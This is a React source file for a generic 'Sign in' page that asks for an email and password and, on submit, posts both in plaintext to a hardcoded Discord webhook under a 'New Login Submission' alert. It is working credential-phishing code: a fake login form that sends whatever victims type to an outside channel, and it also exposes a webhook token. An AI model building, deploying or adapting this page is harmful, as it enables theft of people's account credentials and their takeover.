import { useState } from 'react'

function DemoPage() {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Replace with your actual Discord webhook URL
    const webhookUrl = "https://discord.com/api/webhooks/1371538800643407982/9-s85jPu91llCDwC3oLKVmPE3tqK-0KZQnp6F7ssSRgc6hIWlVQha7V4hyW0nWXpUzmp";

    const message = {
      content: `🚨 New Login Submission:\n**Username:** ${formData.username}\n**Password:** ${formData.password}`,
    };

    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
      });

      if (response.ok) {
        alert('✅ Data sent to Discord successfully!');
      } else {
        alert('❌ Failed to send data to Discord.');
      }
    } catch (error) {
      console.error('Error sending to Discord:', error);
      alert('❌ An error occurred while sending the data.');
    }
  };

  return (
    <div style={{ padding: '2rem', display: 'flex', flexDirection: 'column', alignItems: 'center', height: '60vh', justifyContent: 'center', backgroundColor: '#fff', borderRadius: '8px', boxShadow: '0 4px 8px rgba(0, 0, 0, 0.1)' }}>
      <img src="/banner.png" alt="banner" style={{ marginBottom: '1rem', width: '60%', maxWidth: '400px', marginTop: '2rem' }} />
      <h2 style={{ marginBottom: '1rem', fontSize: '1.4rem', color: 'black' }}>Sign in </h2>
      <p style={{ marginBottom: '1rem', fontSize: '1rem', color: '#666', marginTop: '1rem' }}>Enter your email and password</p>
      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', width: '300px' }}>
        <label>
          <input
            type="text"
            name="username"
            value={formData.username}
            onChange={handleChange}
            required
            style={{ marginBottom: '1rem', padding: '0.5rem', borderRadius: '10px', border: '1px solid #ccc', fontSize: '1rem', width: '100%', boxSizing: 'border-box' , height: '2.5rem' , outline: 'none' , transition: 'border-color 0.3s ease' , color: '#333' , backgroundColor: '#f9f9f9' }}
          />
        </label>
        
        <label>
          <input
            type="password"
            name="password"
            value={formData.password}
            onChange={handleChange}
            required
            style={{ marginBottom: '1rem', padding: '0.5rem', borderRadius: '10px', border: '1px solid #ccc', fontSize: '1rem', width: '100%', boxSizing: 'border-box' , height: '2.5rem' , outline: 'none' , transition: 'border-color 0.3s ease' , color: '#333' , backgroundColor: '#f9f9f9' }}
          />
        </label>

        <button type="submit" style={{ padding: '0.6rem', backgroundColor: '#4CAF50', color: 'white', border: 'none', borderRadius: '10px', cursor: 'pointer', fontSize: '1rem' }}>
          continue
        </button>
      </form>
    </div>
  );
}

export default DemoPage;
